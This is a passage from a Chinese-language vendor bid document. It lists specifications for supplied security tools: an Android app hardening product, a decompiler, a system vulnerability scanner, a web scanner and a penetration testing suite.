title="工具参数"></a>工具参数</h3><p>功能参数如下：</p><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：GLAPPloc</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>对加固壳的自身SO文件进行保护，防止第三方破解工具破解分析；</li><li>防止通过自动化工具进行脱壳、绕过壳保护进行分析；</li><li>对DEX文件整体加密、加壳保护，防止反编译还原源代码，防止静态调试分析；</li><li>对DEX代码内的明文字符串进行加密保护，如密钥、接口地址、敏感信息等；</li><li>对DEX内的代码进行静态抽取、支持对DEX内的类代码进行抽取加密，并且只在类被执行时进行解密；</li><li>支持对DEX内的类代码进行抽取加密，并且在类被执行时不解密类内全部代码，只对被执行到的方法函数进行解密，进一步强化保护能力；</li><li>支持将DEX字节码转换为自定义的虚拟机操作码，以自定义虚拟机进行解释运行；</li><li>支持多套虚拟机及指令的复合保护技术，实现多对多的自定义指令保护模式；</li><li>支持最小细粒度的独立虚拟化保护，实现每个函数的独立自定义指令集，让攻击过程无可持续攻击的操作码；</li><li>支持全范围函数的虚拟化保护，VMP保护技术覆盖全部代码，防止静态分析和动态dump；</li><li>支持对多个DEX文件进行加固保护；</li><li>对SO文件进行加密、加壳保护，防止反编译；</li><li>对SO文件内的字符串/函数表信息进行加密隐藏；</li><li>隐藏SO文件的导入、导入函数，防止通过IDA等工具查看；</li><li>深度防护IDA工具逆向分析，有效防止IDA查看SO伪代码（IDA F5功能）；</li><li>SO动态加解密保护技术，运行时动态清除SO文件运行时的函数符号，并在运行后对函数重新加密，防止对SO的dump攻击；</li><li>支持将SO文件同应用进行绑定，防止SO文件被盗用；</li><li>对C#语言开发的Unity游戏核心DLL文件进行加密保护；</li><li>对Lua语言开发的Cocos游戏核心lua脚本文件进行加密保护；</li><li>对APK内的全部文件进行完整性校验，防止篡改、二次打包；</li><li>在APK运行时对其签名的合法性进行校验，防止篡改、二次打包；</li><li>对DEX文件进行完整性保护，防止篡改；</li><li>对SO文件进行完整性保护，防止篡改；</li><li>对脚本文件进行完整性保护，防止篡改；</li><li>支持aab文件加固；</li><li>对assets目录下的所有资源文件进行完整性保护，防止篡改；</li><li>对res目录下的所有资源文件进行完整性保护，防止篡改；</li><li>支持对xml等配置文件进行完整性保护，防止篡改；</li><li>支持对存储在本地的证书文件进行完整性保护，防止篡改；</li><li>防止利用调试技术或工具对应用进行内存动态调试；</li><li>防止利用内存注入技术对应用进行恶意代码注入；</li><li>防止通过内存dump，获取应用源代码；</li><li>防止各类游戏外挂、应用修改器、变速器；</li><li>防止利用Xposed工具进行Hook攻击；</li><li>防止利用Cydia Substrate工具进行Hook攻击；</li><li>防止利用Frida工具进行Hook攻击</li><li>支持对SQLLITE等数据库文件进行透明加密保护；</li><li>支持对SharedPreferences数据文件进行透明加密保护；</li><li>支持对Webview数据文件进行透明加密保护；</li><li>支持将加密后的数据文件同设备进行绑定，防止文件复用、盗用；</li><li>对所有资源文件进行抽取、整体加密；</li><li>支持对assets资源文件进行透明加密保护；</li><li>支持对res资源文件进行透明加密保护；</li><li>支持对配置文件进行透明加密保护；</li><li>支持对SSH等证书文件进行透明加密保护；</li><li>在不改变语义的前提下，通过控制流平坦化将控制流进行混淆处理；</li><li>对跳转逻辑的判断值进行隐藏，增加攻击者逆向分析的难度；</li><li>可使用规则确定需混淆的范围，对范围内的类名、方法名、函数名进行自动混淆；</li><li>对字符串进行加密，支持单独加固范围选择；</li><li>增加新的虚假控制分支，加大破解和分析原始控制流的难度；</li><li>混淆引入随机性，每次混淆代码不一样；</li><li>防止通过GDB、LLDB等工具对代码进行动态调试；</li><li>防止通过Inline Hook工具修改代码段、机器码进行hook攻击，如frida等；</li><li>防止通过Swizzling Hook工具篡改动态映射、外部关系进行hook攻击</li><li>防止通过Cycript指令进行恶意代码注入；</li><li>防止代码被篡改，对代码完整性进行安全校验、防止针对代码的非法篡改；</li><li>所有动态保护功能基于源代码一体化自动加固实现，不用担心基于SDK集成带来的被单点绕过风险；</li><li>在APP运行时开启自动守护功能，随时对调试行为进行监测和阻断。</li><li>在APP运行时开启自动守护功能，随时对hook行为进行监测和阻断</li><li>支持防Inline Hook</li><li>支持防Swizzling Hook</li><li>在APP运行时开启自动守护功能，对代码段进行完整性</li><li>在不改变语义的前提下，通过控制流平坦化将控制流进行混淆处理</li><li>对跳转逻辑的判断值进行隐藏，增加攻击者逆向分析的难度</li><li>对字符串进行加密，支持单独加固范围选择</li><li>增加新的虚假控制分支，加大破解和分析原始控制流的难度</li><li>混淆引入随机性，每次混淆代码不一样</li><li>防止通过GDB、LLDB等工具对代码进行动态调试</li><li>防止通过Inline Hook工具修改代码段、机器码进行hook攻击，如frida等</li><li>所有动态保护功能基于源代码一体化自动加固实现，不用担心基于SDK集成带来的被单点绕过风险</li><li>支持软件license和数据库三年之内免费升级。</li></ol><h2 id="Android应用程序反编译工具"><a href="#Android应用程序反编译工具" class="headerlink" title="Android应用程序反编译工具"></a>Android应用程序反编译工具</h2><h3 id="工具概述-16"><a href="#工具概述-16" class="headerlink" title="工具概述"></a>工具概述</h3><p>安卓应用程序反编译可支持常见的Android应用程序包的静态及动态分析，可以进行反编译。</p><h3 id="工具方案-16"><a href="#工具方案-16" class="headerlink" title="工具方案"></a>工具方案</h3><h4 id="软件方案-16"><a href="#软件方案-16" class="headerlink" title="软件方案"></a>软件方案</h4><p>架构设计：采用模块化设计，包括用户界面模块、文件处理模块、反编译模块、反汇编模块、调试模块、解析模块等。模块之间通过接口进行通信，实现功能的独立性和可扩展性。</p><p>用户界面模块：提供可视化用户界面，包括菜单、工具栏、文件选择器、结果显示窗口等，使用户能够方便地操作和查看分析结果。</p><p>文件处理模块：负责处理不同类型的文件，包括APK文件、DEX文件、ODEx文件、X-APK文件、Linux ELF文件、ELF64文件等。该模块提供文件解析、读取、写入等功能。</p><p>反编译模块：Dalvik字节码反编译：将APK中的.dex文件转换为Java源代码；ARM/ARM64反编译：将基于ARM架构的二进制代码转换为高级语言代码；Android APK反编译：处理APK文件中的各种格式（dex, odex, x-apk）并将其转换为源代码；Linux ELF/ELF64文件反编译：支持Linux系统下的二进制文件反编译。</p><p>反汇编模块：支持Dalvik反汇编、ARM反汇编、ARM64反汇编等。该模块将目标文件转换为汇编代码，以便进行底层分析和调试。</p><p>调试模块：支持Dalvik调试、ARM调试、ARM64调试。该模块提供Dalvik和ARM/ARM64调试器，支持针对Dalvik虚拟机运行的应用和在实体设备和模拟器上进行ARM架构的应用调试。允许用户在目标应用程序中设置断点、观察变量、单步执行等。</p><p>解析模块：支持解析常见的Android应用文件，包括HTML、XML、JSON、(B)plist等结构化文件，以及图像文件、证书文件、Mach-O执行文件等。该模块提供解析和展示这些文件的内容。</p><p>插件系统：允许第三方开发者贡献额外的功能和改进。</p><p>自动化脚本：让用户可以编写脚本来自动化常见的反编译任务。</p><p>报告和文档：生成详细的分析报告和文档，方便用户理解和分享结果。</p><h4 id="工具功能-16"><a href="#工具功能-16" class="headerlink" title="工具功能"></a>工具功能</h4><ol><li><p>工具提供对Android平台上主流的执行代码和文件格式的广泛支持。对于Dalvik虚拟机产生的.dex文件，工具能够实现反编译。对于ARM架构，工具不仅支持32位代码的反编译和反汇编（包括Thumb指令集），还支持64位ARM架构（ARM64或Aarch64）的反编译和反汇编，确保了对现代Android设备的全面覆盖。针对Android APK文件，工具能够处理标准的dex文件、优化后的odex文件以及扩展的x-apk文件。对于Linux环境，工具同样支持ELF和ELF64文件格式的反编译。在反汇编方面，工具能够将Dalvik字节码、ARM和ARM64指令集转换为人类可读的汇编语言。在调试支持方面，该工具提供了对Dalvik、ARM和ARM64架构的调试能力。</p></li><li><p>工具支持对APK文件的静态和动态分析。静态分析允许用户在不执行代码的情况下评估其结构，包括权限、代码流和库依赖等。动态分析方面，工具能够在应用程序运行时监控其行为，包括API调用、网络活动和文件访问等。</p></li><li><p>对于iOS应用的逆向工程，工具支持ARM和ARM64架构的反汇编，以及对zip、7z、tar等压缩文件的解压。图像文件（bmp、png、jpg、gif、ico）和结构化文件（html、xml、json、(b)plist）的解析功能，帮助开发者更好地理解应用资源和配置。x.509证书解析和Mach-O可执行文件解析功能将进一步扩展工具的逆向工程能力。此外，对C、C++、Objective-C和Swift等语言的反编译支持将大大提高对iOS应用代码的理解。</p></li><li><p>工具支持连接实体iOS设备进行ARM和ARM64调试，以及在虚拟化环境中模拟iOS系统进行调试，为开发者提供灵活性。符号执行的支持将进一步提高调试的效率，允许更准确地预测程序在不同输入下的行为。</p></li><li><p>工具将包含一个直观的可视化用户界面，使开发者能够轻松地进行交叉引用检查和代码导航。用户可以对方法、函数和符号进行重新命名，以符合其在逆向工程中的理解，这有助于提高代码的可读性。此外，工具支持在字段、类、代码和数据之间的导航。</p></li></ol><h3 id="产品彩页-24"><a href="#产品彩页-24" class="headerlink" title="产品彩页"></a>产品彩页</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/d22c20293d9e50661ee66df5bd61dfe7.png"></p><h3 id="工具参数-16"><a href="#工具参数-16" class="headerlink" title="工具参数"></a>工具参数</h3><p>功能参数如下：</p><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：JEB</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>安卓逆向检测分析工具支持Dalvik反编译、ARM反编译、ARM64反编译、AndroidAPK(包含dex,odex,x-apk文件)反编译、LinuxELF/ELF64文件反编译、Dalvik反汇编、ARM(32,Thumb)反汇编、ARM64(Aarch64)反汇编等，支持Dalvik调试、ARM调试、ARM64调试；</li><li>支持常见Android应用文件APK的静态与动态分析；</li><li>支持IOS应用的逆向分析检测，支持支持ARM/ARM64反汇编、zip,7z,tar解压、bmp,png,jpg,gif,ico图像文件及解析、html,xml,json,(b)plist结构化文件解析、x.509证书解析、Mach-O执行文件解析、支持C,C++,Objc,Swift等语言反编译；</li><li>支持实体iOS设备ARM/ARM64调试，以及基于ARM/ARM64的虚拟化iOS系统进行调试，支持符号执行；</li><li>支持可视化用户界面，支持检查交叉引用，方法/函数/符号支持重新命令，字段、类、代码和数据之间支持导航；</li><li>支持软件license和数据库三年之内免费升级。</li></ol><p>使用手册如下：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/fb442a6e2868f47959d44e3279592863.jpeg" alt="jeb工具使用手册_01"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/60ea584d6e5c69f2dffd8e0d945a37ad.jpeg" alt="jeb工具使用手册_02"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/cbbdb20cc7cb9b52f1d6e58f4f00b813.jpeg" alt="jeb工具使用手册_03"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/decc71b37b2cc2719c290160f85cd76a.jpeg" alt="jeb工具使用手册_04"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/7499cc01184a0ee8993d19c4387b921b.jpeg" alt="jeb工具使用手册_05"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/8efc9a2c654a72923b38d7fd34bb420b.jpeg" alt="jeb工具使用手册_06"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/93895367ff073e4d7cf84fe569f8fa06.jpeg" alt="jeb工具使用手册_07"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/569a2a0250bd602119658f58441bc64a.jpeg" alt="jeb工具使用手册_08"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/c58356a3849edb57c494710f33c953ed.jpeg" alt="jeb工具使用手册_09"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/f452a7a0bfe3ca7244abd6a949dba922.jpeg" alt="jeb工具使用手册_10"></p><h2 id="系统漏洞扫描工具"><a href="#系统漏洞扫描工具" class="headerlink" title="系统漏洞扫描工具"></a>系统漏洞扫描工具</h2><h3 id="工具概述-17"><a href="#工具概述-17" class="headerlink" title="工具概述"></a>工具概述</h3><p>工具具有扫描任意端口任意服务的能力；以用户指定的格式（ASCII 文本、html 等）产生详细的输出报告，包括目标的脆弱点、怎样修补漏洞以防止黑客入侵及危险级。</p><h3 id="工具方案-17"><a href="#工具方案-17" class="headerlink" title="工具方案"></a>工具方案</h3><h4 id="软件方案-17"><a href="#软件方案-17" class="headerlink" title="软件方案"></a>软件方案</h4><p>软件架构设计：软件架构包括登录与认证、仪表盘、扫描管理、警报与事件、报告模板、设置与配置、资产管理、知识库、高级分析工具、API与集成模块。模块之间通过接口进行通信，实现功能的独立性和可扩展性。</p><p>1. 登录与用户认证模块</p><p>登录界面：安全的登录页面，支持多因素认证。</p><p>用户管理：允许管理员添加、删除和管理用户账户和权限。</p><p>2. 仪表盘</p><p>系统状态概览：显示整体安全状况，包括活动警报和最近的扫描结果。</p><p>扫描进度监控：实时显示当前扫描任务的进度和状态。</p><p>快速入口：提供快速访问常用功能的入口，如启动扫描、查看报告等。</p><p>3. 扫描管理</p><p>新建扫描任务：允许用户配置和启动新的漏洞扫描任务。</p><p>扫描计划：设置定期扫描的时间表和重复规则。</p><p>历史扫描记录：查看过往的扫描结果和历史数据。</p><p>4. 警报与事件</p><p>警报列表：展示当前的安全警报和事件，包括详细信息和状态。</p><p>事件处理：对选定的警报进行分类、注释和关闭操作。</p><p>工单生成：从警报中创建工单，并分配给相应的处理人员。</p><p>5. 报告模块</p><p>报告生成：根据用户选择的参数生成定制化的报告。</p><p>报告查看：在线查看或下载已生成的报告。</p><p>报告历史：存档和检索以往的报告。</p><p>6. 设置与配置</p><p>扫描配置：定义扫描的范围、深度和行为，如凭据扫描、非凭据扫描等。</p><p>通知设置：配置警报通知的方式，如电子邮件、短信或集成到其他系统。</p><p>合规性标准：选择和定制合规性扫描模板，如PCI DSS、HIPAA等。</p><p>7. 资产管理</p><p>资产清单：录入和管理组织内的资产信息。</p><p>资产分组：对资产进行分类和分组，以便于管理和扫描。</p><p>8. 知识库</p><p>漏洞信息：提供详细的漏洞信息和修复建议。</p><p>帮助文档：包含工具使用说明、FAQ和故障排除指南。</p><p>联系支持：提供联系技术支持的途径。</p><p>9. 高级分析工具</p><p>趋势分析：展示漏洞发现和修复的趋势图表。</p><p>风险评估：基于扫描结果进行风险评估和优先级排序。</p><p>10. API与集成</p><p>API访问：提供API接口的文档和管理工具。</p><p>集成选项：配置和管理与其他系统的集成，如SIEM、MDM等。</p><h4 id="工具功能-17"><a href="#工具功能-17" class="headerlink" title="工具功能"></a>工具功能</h4><p>漏洞扫描工具具备多种主动发现方法，包括：端口扫描：系统能够执行快速的端口扫描，以发现开放的端口和相关服务，从而识别潜在的入侵点。应用程序扫描：能够检查应用程序的运行时行为，包括常用的Web应用程序，以发现诸如SQL注入、跨站脚本等漏洞。网络扫描：通过网络扫描，系统侦测到网络中的所有设备，包括路由器、交换机、打印机等，并对它们的安全状况进行评估。</p><p>移动设备管理：工具支持查询移动设备管理（MDM）系统，以获取设备的详细属性信息，如设备型号、操作系统版本、安装的应用程序和配置设置。这有助于在资产清单中对移动设备进行更准确的分类和风险评估。</p><p>网络监控：工具能够监控网络活动和网络日志，以便识别临时或不受管理的设备，这些设备可能成为网络中的薄弱环节。监控应包括流量分析和异常行为检测。</p><p>广泛的支持范围：工具具备跨平台的扫描能力，并能够理解和处理各种不同的系统架构和配置，系统支持在物理、虚拟和云基础设施中广泛的服务器、端点、网络设备、操作系统、数据库和应用程序。</p><p>扫描类型：工具支持以下两种扫描类型：非凭据扫描：远程扫描，无需系统凭据，用于快速识别网络中的设备和服务；凭据扫描：本地扫描，使用系统凭据，能够进行更深入的系统检查，包括未安装补丁的检测、配置错误和系统弱点。</p><p>多种扫描模式：为了缩小攻击面，工具提供多种扫描模式，如全面扫描、快速扫描、定时扫描和事件驱动扫描，企业可以根据需要频繁地扫描更多资产。</p><p>网络流量分析：通过分析网络流量，工具能够识别新的、临时的和不受管理的资产中的服务器和客户端漏洞风险。这包括对未知流量的深入分析，以便于识别潜在的威胁。</p><p>支持多种模板：工具支持多种合规性标准和模板，包括PCI、HIPAA/HITECH、NERC、FISMA、GLBA、SOX以及CERT、CIS、COBIT/ITIL、DISA STIGS和NIST等，以帮助企业满足特定的行业法规要求。</p><p>恶意软件比较：工具能够将在系统上运行的进程与已知恶意软件的数据库进行比较，以识别潜在的安全威胁。</p><p>审计自动运行设置：工具能够审计自动运行设置（如Windows的自启动项），以发现和移除持续性恶意软件。</p><p>IDS日志整合：将入侵检测系统（IDS）的日志与发现的漏洞风险相结合，工具能够确定响应优先顺序，以便快速响应最严重的威胁。</p><p>自动记录与警报：在发生事件异常或检测到新用户、设备和连接时，工具自动记录并可选择性地发出警报，以便及时采取行动。</p><p>SQL监控与僵尸网络检测：监测SQL活动以识别损害指标，并检测与已知僵尸网络和C&amp;C系统的通信，旨在阻止恶意活动。</p><p>账户活动检测：检测可能指示凭据被盗或可疑内部行为的账户活动，以便及时采取预防措施。</p><p>敏感数据流量监控：工具能够检测网络中未加密的敏感数据流动，如信用卡数据和社会安全号码，以防止数据泄露。</p><p>交互操作性：漏洞扫描工具与补丁管理、移动设备管理、云服务和威胁情报应用程序等进行交互操作，便于集成和自动化工作流程。</p><p>API支持：工具提供API支持，以实现集中管理、报告、修复和工作流自动化，使得漏洞管理更加高效。</p><p>通知与工单系统：对于选定的漏洞风险或发生的警报，工具能够发送电子邮件警报，并创建工单以进行进一步的调查和处理。</p><p>事件管理与报告：工具能够将事件信息发送到企业安全信息和事件管理（SIEM）系统，并自动分发漏洞报告。</p><p>可视化界面与报告：工具提供整理和整合漏洞风险分析信息的可视化操作界面，以及长期漏洞风险、事件和网络活动状态的折线图表示。</p><p>网络范围与漏洞库更新：工具无扫描网段限制，并能够及时动态更新漏洞库至最新版，以确保安全措施的时效性。</p><p>移动部署与并发扫描：工具能够移动部署，适应企业的灵活性需求，并能够同时并发扫描多个IP地址（至少32个）。</p><p>移动设备扫描与合规性：工具支持移动设备扫描，帮助企业满足法规和企业要求，如执行PCI DSS要求以实现安全配置和系统强化。</p><p>控制系统审核：工具能够控制系统审核，包括SCAIVI系统、嵌入式设备以及工业控制系统（ICS）应用程序。</p><p>支持范围：工具支持扫描包括虚拟化环境、操作系统、数据库、网络应用程序以及云服务在内的广泛技术栈。</p><h3 id="产品彩页-25"><a href="#产品彩页-25" class="headerlink" title="产品彩页"></a>产品彩页</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/5183c69bbe42878449f52521ee5b1f94.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/e38738ea39d76113d6a15d1914fa20e2.png"></p><h3 id="工具参数-17"><a href="#工具参数-17" class="headerlink" title="工具参数"></a>工具参数</h3><p>功能参数如下：</p><p>我司为本项目提供的该工具信息如下：</p><p>品牌：国利</p><p>型号：GLscncg</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>具备超过一种主动发现方法</li><li>支持查询移动设备管理系统以增强资产属性</li><li>监控网络活动和网络日志，以识别临时和不受管理的设备</li><li>支持物理、虚拟和云基础设施中最广泛的服务器、端点、网络设备、操作系统、数据库、应用程序</li><li>支持非凭据、远程扫描以及凭据、本地扫描，以对在线及离线或远程扫描的资产进行深入、具体的分析</li><li>多种扫描模式可让企业更频繁地扫描更多资产，以缩小它们的攻击面</li><li>分析网络流量，以识别新的、临时的和不受管理的资产中的服务器和客户端漏洞风险</li><li>支持PCI、HIPAA/HITECH和NERC模板，支持FISMA、GLBA和SOX标准，支持CERT、CIS、COBIT/ITIL、DISASTIGS和NIST模板</li><li>比较进程与已知恶意软件</li><li>审计自动运行设置以发现持续性恶意软件</li><li>将IDS日志与主动和被动发现的漏洞风险，以确定响应的优先顺序</li><li>在发生事件异常时自动记录及选择性地发出警报</li><li>在网络中检测到之前从未见过的用户、设备和连接时自动记录及选择性地发出警报</li><li>监测SQL活动以识别损害指标</li><li>检测与已知僵尸网络和C&amp;C系统的传入和传出通信</li><li>检测可能指示凭据被盗或可疑内部行为的账户活动</li><li>检测离开网络的敏感的未加密数据，例如信用卡数据和社会安全号码</li><li>支持与补丁管理、移动设备管理、云、威胁情报应用程序等进行交互操作</li><li>API支持集中管理、报告、更正和工作流</li><li>对选定的漏洞风险或发生的警报发送电子邮件警报</li><li>创建并分配工单，以进行进一步调查</li><li>发送事件到企业SIEM系统</li><li>可自动分发报告库</li><li>整理和整合漏洞风险分析信息的可视化操作界面</li><li>折线图显示长期漏洞风险分析和状态</li><li>可以自动分发的网络事件和活动报告库</li><li>显示漏洞风险、事件和网络活动综合信息的操作页面</li><li>折线图显示长期漏洞风险、事件和网络活动状态</li><li>无扫描网段限制</li><li>能够及时动态更新漏洞库，及时更新到最新版</li><li>能够移动部署</li><li>能够同时并发扫描32个IP</li><li>支持移动设备扫描</li><li>合规：帮助满足法规和企业要求</li><li>帮助执行PCIDSS要求，以实现安全配置、系统强化</li><li>能够控制系统审核：SCAIVI系统、嵌入式设备以及ICS应用程序</li><li>支持扫描虚拟化、操作系统、数据库、网络应用程序云</li><li>支持软件license和数据库三年之内免费升级。</li></ol><h2 id="Web安全扫描工具"><a href="#Web安全扫描工具" class="headerlink" title="Web安全扫描工具"></a>Web安全扫描工具</h2><h3 id="工具概述-18"><a href="#工具概述-18" class="headerlink" title="工具概述"></a>工具概述</h3><p>作为一款自动化评估类工具,依据制定的策略对Web应用系统进行URL深度发现并全面扫描,寻找出Web应用真实存在的安全漏洞。</p><h3 id="工具方案-18"><a href="#工具方案-18" class="headerlink" title="工具方案"></a>工具方案</h3><h4 id="软件方案-18"><a href="#软件方案-18" class="headerlink" title="软件方案"></a>软件方案</h4><p>1. 架构设计</p><p>模块化和微服务架构：工具设计为一系列独立但协作的微服务，每个服务负责一个特定的功能，如扫描引擎、结果分析、用户界面、数据库管理等。这样的架构支持可扩展性和容错性。</p><p>容器化部署：使用Docker容器封装各个微服务，支持在各种环境中的一致性部署，同时利用Kubernetes进行容器编排，以实现自动化的伸缩和管理。</p><p>API网关：设计API网关作为微服务和外部请求之间的中介，提供安全的访问控制、流量管理和服务聚合。</p><p>2. 安全测试自动化</p><p>集成和插件系统：提供与常见CI/CD工具的插件，如Jenkins、Travis CI、GitLab CI等，以便于在软件开发生命周期中自动触发安全扫描。</p><p>调度器：用于计划和执行定期扫描任务，并支持对扫描活动的全面控制。</p><p>审计追踪：用于记录所有用户操作和系统事件，确保满足入职和审计要求。</p><p>3. 风险和合规性展示</p><p>漏洞数据库和风险评估引擎：集成公开的漏洞数据库，并开发一个风险评估引擎，用于分析漏洞数据和生成风险评分。</p><p>报告生成器：报告生成器，用于创建定制化的安全报告，这些报告应该包含风险评估结果和合规性状态。</p><p>4. 性能度量</p><p>KPI仪表盘：仪表盘，展示关键性能指标，如漏洞发现率、修复率等，以便用户可以实时监控安全测试的进度和效果。</p><p>数据分析模块：用于处理扫描结果数据，并提供趋势分析和预测。</p><p>5. 自定义策略和风险管理</p><p>策略引擎：允许用户定义和管理自己的扫描策略和风险偏好。</p><p>风险管理工作区：让用户可以设置风险阈值、分类漏洞并指定修复的优先级。</p><p>6. 用户界面和体验</p><p>响应式Web前端：使用现代前端框架（如React或Angular）开发的Web应用，用户可以在不同的设备上使用工具。</p><p>用户体验（UX）设计：用户界面简洁、直观，减少学习曲线，提供清晰的导航和操作流程。</p><p>7. 数据存储和管理</p><p>数据库选择：采用适合大量数据读写和查询的数据库系统。</p><p>数据加密和备份：确保所有敏感数据都经过加密，提供数据备份和恢复的机制。</p><h4 id="工具功能-18"><a href="#工具功能-18" class="headerlink" title="工具功能"></a>工具功能</h4><p>可扩展部署方式：工具提供灵活的部署选项，包括单机部署、分布式部署以及云服务集成。工具支持容器化部署，如Docker和Kubernetes，以及与DevOps工具链的无缝集成，如Jenkins和GitLab CI。支持在CI/CD流程中嵌入安全测试，实现DevSecOps的目标。工具提供API接口，允许团队在不同的开发和生产环境中部署和管理扫描任务，以及策略的制定和更新。</p><p>安全测试自动化：该工具支持全面的自动化测试，允许用户创建和调度定制的扫描任务，并且能够集成到代码提交和部署的自动化流程中。此外，工具提供对入职和审计活动的详细记录和完全控制，包括用户操作日志、扫描历史以及更改审计。帮助组织满足合规性要求，并提供必要的文档以支持审计过程。</p><p>风险展示：工具能够清晰地展示由于漏洞而产生的安全风险和潜在的法规遵从性问题。工具支持将漏洞信息与公开的安全漏洞数据库进行对比，并根据漏洞的严重性、影响范围和修复难度等因素计算风险评分。此外，工具提供易于理解的风险报告，以便非技术利益相关者也能理解风险的严重性。</p><p>性能度量：工具提供性能度量仪表盘，用于追踪和展示安全测试的进度和效果。包括漏洞发现率、修复率、测试覆盖率等关键性能指标（KPIs）。可以监控安全测试的效果，并在需要时进行策略调整。</p><p>自定义策略风险：组织能够根据自己的安全需求和风险承受能力定制扫描策略。工具允许用户定义哪些漏洞类型是可接受的风险，哪些需要立即修复。用户能够设置不同的风险等级和相应的响应措施，并且这些策略可以随着组织安全需求的变化而灵活调整。</p><h3 id="产品彩页-26"><a href="#产品彩页-26" class="headerlink" title="产品彩页"></a>产品彩页</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/c24a3f67a07ed31040598b1f3969098f.png"></p><h3 id="工具参数-18"><a href="#工具参数-18" class="headerlink" title="工具参数"></a>工具参数</h3><p>功能参数如下：</p><p>我司为本项目提供的该工具信息如下：</p><p>品牌：国利</p><p>型号：GLwebscncw</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>支持可扩展的部署方式，允许组织管理其所有应用程序的应用程序安全程序。安全和开发团队可以在整个应用程序生命周期中协作、建立策略和扩展测试；</li><li>支持安全测试自动化和对入职和审计活动的完全控制；</li><li>支持显示由已识别的漏洞带来的安全和法规遵从性风险；</li><li>支持通过性能度量来演示的进度；</li><li>支持自定义策略的风险；</li><li>支持软件license和数据库三年之内免费升级。</li></ol><h2 id="集成渗透测试工具"><a href="#集成渗透测试工具" class="headerlink" title="集成渗透测试工具"></a>集成渗透测试工具</h2><h3 id="工具概述-19"><a href="#工具概述-19" class="headerlink" title="工具概述"></a>工具概述</h3><p>用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。</p><h3 id="工具方案-19"><a href="#工具方案-19" class="headerlink" title="工具方案"></a>工具方案</h3><h4 id="软件方案-19"><a href="#软件方案-19" class="headerlink" title="软件方案"></a>软件方案</h4><p>漏洞扫描模块：配置面板：允许用户选择漏洞扫描类型、设置扫描深度等。结果面板：显示扫描结果，按照风险级别分类并提供详细报告。</p><p>Web爬虫与分析模块：爬虫设置：用于配置爬虫的行为，如速度、深度等。分析选项：允许用户选择静态或动态分析，以及相关设置。结果展示：图形化展示爬取的网站结构和分析结果。</p><p>服务器端漏洞检测模块：扫描配置：设置目标服务器、认证信息、扫描类型等。检测报告：展示服务器漏洞检测结果和修复建议。</p><p>API监控模块：监控规则设置：定义API监控的白名单/黑名单和通知规则。监控结果：显示API调用监控数据和安全事件。</p><p>内容发现模块：发现设置：配置字典、路径规则、响应过滤等。发现结果：列出发现的隐藏内容和链接。</p><p>URL分析模块：分析设置：定义URL分析的深度和重要性评分。URL列表：展示静态和动态URL及其参数详情。</p><p>请求/响应拦截与重写模块：规则配置：用户可以定义请求和响应的匹配和替换规则。历史记录：显示已拦截和重写的请求/响应历史。</p><p>SSL代理模块：证书配置：生成和管理伪造的SSL证书。代理设置：配置代理行为和加密算法。</p><p>会话令牌分析模块：分析选项：选择测试样本大小和统计方法。分析结果：图形和报告显示令牌随机性分析。</p><p>点击劫持攻击模块：测试配置：设置框架检测策略和劫持技术。测试结果：显示是否容易受到点击劫持攻击。</p><p>代理流量分析模块：流量监控：实时监控请求和响应的详细信息。数据过滤：根据用户需求过滤和搜索特定的流量数据。</p><h4 id="工具功能-19"><a href="#工具功能-19" class="headerlink" title="工具功能"></a>工具功能</h4><p>漏洞扫描：支持检测至少100项通用漏洞，包括但不限于SQL注入、跨站脚本（XSS）、命令注入、文件上传漏洞等。参数将包括漏洞扫描深度设置、漏洞类型选择、自定义扫描规则，以及漏洞影响级别评估。</p><p>Web爬虫与分析：支持高效的Web应用程序爬虫，对网站结构进行全面映射。同时，对JavaScript的静态和动态分析能力将帮助识别客户端运行时的安全问题。参数设置将包括爬虫速度、爬取深度、排除规则、以及动态执行超时设置。</p><p>服务器端漏洞检测：对检测服务器配置错误、服务版本漏洞等服务器端安全问题进行检测。允许用户指定扫描范围、认证信息、以及检测精度等。</p><p>API监控：监控目标应用程序的API调用，特别是那些可能导致安全风险的敏感API。包括API白名单/黑名单设置、风险级别通知、以及自定义API行为分析规则。</p><p>内容发现：帮助用户发现和映射Web应用中的隐藏内容和功能。参数包括字典设置、路径排除、响应代码过滤、以及内容优先级标记。</p><p>URL分析：展示静态和动态URL的数量，以及它们的参数详情。参数设置包括URL统计显示选项、参数分析深度、以及URL重要性评分。</p><p>请求/响应拦截与重写：允许用户定义匹配和替换规则，自动对通过代理的请求和响应进行修改。参数包括规则定义、应用范围、以及规则优先级设置。</p><p>SSL代理：支持伪造代理证书，以便在HTTPS流量中进行中间人攻击。参数包括证书生成设置、加密算法选择、以及证书有效期设置。</p><p>会话令牌分析：使用标准的随机性测试来对会话令牌进行统计分析，以识别潜在的会话固定和会话预测漏洞。参数包括测试样本大小、统计方法选择、以及分析报告详细程度。</p><p>点击劫持攻击：